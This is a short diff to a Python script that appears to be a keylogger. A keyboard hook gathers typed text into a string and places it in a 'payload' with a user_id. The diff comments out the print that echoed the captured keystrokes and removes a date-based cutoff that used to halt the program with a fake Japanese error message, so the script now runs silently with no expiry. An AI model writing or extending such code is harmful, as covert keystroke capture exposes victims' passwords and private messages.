@@ -24,7 +24,7 @@ def on_press(key):
     except AttributeError:
         if key in (keyboard.Key.space, keyboard.Key.enter):
             input_string = ''.join(current_input)
-            print(input_string)
+            # print(input_string)
 
             payload = {
                 'user_id': 200,
@@ -151,10 +151,4 @@ def new():
 
         
 if __name__ == '__main__':
-    specific_date = datetime(2024, 11, 25)
-    current_date = datetime.now()
-
-    if specific_date < current_date:
-        print('>>> すみません、何かバグがあるようです。 <<<')
-    else:
-        new()
+    new()
